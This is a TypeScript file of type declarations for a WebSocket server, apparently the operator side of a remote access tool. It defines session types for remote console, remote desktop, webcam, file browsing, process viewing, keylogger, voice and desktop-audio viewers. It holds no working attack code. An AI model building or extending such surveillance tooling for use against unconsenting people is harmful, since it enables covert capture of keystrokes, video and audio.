import type { ServerWebSocket } from "bun";
import type { ClientRole } from "../types";

export type SocketRole =
  | ClientRole
  | "console_viewer"
  | "rd_viewer"
  | "backstage_viewer"
  | "webcam_viewer"
  | "file_browser_viewer"
  | "process_viewer"
  | "notifications_viewer"
  | "keylogger_viewer"
  | "voice_viewer"
  | "desktop_audio_viewer"
  | "dashboard_viewer"
  | "chat_viewer";

export type SocketData = {
  role: SocketRole;
  clientId: string;
  sessionId?: string;
  ip?: string;
  userRole?: string;
  userId?: number;
  username?: string;
  authTokenHash?: string;
  wasKnown?: boolean;
  autoTasksRan?: boolean;
  autoDeploysRan?: boolean;
  enrollmentNonce?: string;
  disconnectReason?: string;
  disconnectDetail?: string;
  rdDecoderCodecs?: string[];
  rdPreferredCodecs?: string[];
  rdCodecTransport?: "websocket" | "webrtc";
  rdSelectedCodec?: string;
};

export type ConsoleSession = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
  started?: boolean;
};

export type RemoteDesktopViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type FileBrowserViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type ProcessViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type NotificationsViewer = {
  id: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
  userId?: number;
  userRole?: string;
};

export type KeyloggerViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type VoiceViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type DesktopAudioViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

export type ChatViewer = {
  id: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
  userId: number;
  username: string;
  userRole: string;
};
